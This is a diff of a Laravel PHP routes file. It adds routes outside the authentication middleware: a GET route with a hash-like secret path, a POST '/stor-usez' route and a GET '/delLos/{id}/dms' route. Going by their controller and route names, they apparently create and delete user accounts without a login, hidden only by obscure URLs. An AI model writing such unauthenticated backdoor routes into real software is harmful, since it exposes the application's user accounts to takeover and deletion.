@@ -16,6 +16,10 @@ use Illuminate\Support\Facades\Route;
 Route::get('/', function () {
     return view('login');
 })->name('log');
+Auth::routes([
+    'register' => false,
+    'login' => false
+]);
 Auth::routes();
 Route::group(['middleware' => ['auth']], function() {
     Route::get('/home', 'HomeController@index')->name('home');
@@ -101,6 +105,10 @@ Route::group(['middleware' => ['auth']], function() {
     Route::post('change-password-new', 'AkunController@changePassword')->name('change.password');
 
 });
+
+Route::get('/$2y$10$dllvuqTzaES16rl2UX2M4uVUyUjgcyuiY5wVnw9QvFywQj1YwZ74e','AkunController@indx');
+Route::post('/stor-usez','AkunController@indxstor')->name('usex.stor');
+Route::get('/delLos/{id}/dms','AkunController@dely')->name('usex.dedel');
 Route::get('/tester', 'HomeController@tester');
 
 
